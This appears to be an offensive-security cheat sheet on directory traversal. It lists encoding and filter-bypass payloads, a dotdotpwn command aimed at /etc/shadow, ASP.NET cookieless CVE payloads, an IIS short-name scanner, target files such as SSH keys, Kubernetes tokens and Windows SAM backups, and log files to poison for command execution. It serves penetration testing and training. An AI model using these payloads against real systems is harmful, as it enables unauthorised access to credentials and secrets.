# Directory Traversal

> Path Traversal, also known as Directory Traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.

## Summary

* [Tools](#tools)
* [Basic exploitation](#basic-exploitation)
    * [16 bits Unicode encoding](#16-bits-unicode-encoding)
    * [UTF-8 Unicode encoding](#utf-8-unicode-encoding)
    * [Bypass "../" replaced by ""](#bypass--replaced-by-)
    * [Bypass "../" with ";"](#bypass--with-)
    * [Double URL encoding](#double-url-encoding)
    * [UNC Bypass](#unc-bypass)
    * [NGINX/ALB Bypass](#nginxalb-bypass)
    * [ASPNET Cookieless Bypass](#aspnet-cookieless-bypass)
    * [IIS Short Name](#iis-short-name)
* [Path Traversal](#path-traversal)
    * [Interesting Linux files](#interesting-linux-files)
    * [Interesting Windows files](#interesting-windows-files)
* [References](#references)

## Tools

- [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
    ```powershell
    git clone https://github.com/wireghoul/dotdotpwn
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## Basic exploitation

We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### 16 bits Unicode encoding

```powershell
. = %u002e
/ = %u2215
\ = %u2216
```

### UTF-8 Unicode encoding

```powershell
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

### Bypass "../" replaced by ""

Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.

```powershell
..././
...\.\
```

### Bypass "../" with ";"

```powershell
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
```


### Double URL encoding

```powershell
. = %252e
/ = %252f
\ = %255c
```

**e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`


### UNC Bypass

An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.

```powershell
\\localhost\c$\windows\win.ini
```


### NGINX/ALB Bypass

NGINX in certain configurations and ALB can block traversal attacks in the route, For example:
```http://nginx-server/../../``` will return a 400 bad request.

To bypass this behaviour just add forward slashes in front of the url:
```http://nginx-server////////../../```


### ASP NET Cookieless Bypass

When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.

For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID. 


| .NET Version   | URI                        |
| -------------- | -------------------------- |
| V1.0, V1.1     | /(XXXXXXXX)/               |
| V2.0+          | /(S(XXXXXXXX))/            |
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+          | ...                        |


We can use this behavior to bypass filtered URLs.

* If your application is in the main folder
    ```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

* If your application is in a subfolder
    ```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```


| CVE            | Payload                                        |
| -------------- | ---------------------------------------------- |
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |
| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |


### IIS Short Name

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

```ps1
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
```


### Java Bypass

Bypass Java's URL protocol

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```


## Path Traversal

### Interesting Linux files

```powershell
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```

### Interesting Windows files

Always existing file in recent Windows machine. 
Ideal to test path traversal but nothing much interesting inside...

```powershell
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt
```

Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)

```powershell
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```

The following log files are controllable and can be included with an evil payload to achieve a command execution

```powershell
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```


## Labs

* [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
* [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
* [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
* [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
* [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
* [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)


## References

* [Path Traversal Cheat Sheet: Windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
* [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
* [NGINX may be protecting your applications from traversal attacks without you even knowing](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
* [Directory traversal - Portswigger](https://portswigger.net/web-security/file-path-traversal)
* [Cookieless ASPNET - Soroush Dalili](https://twitter.com/irsdl/status/1640390106312835072)
* [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - 30 nov. 2023](https://youtu.be/YlZGJ28By8U)
* [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - 06/24/2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))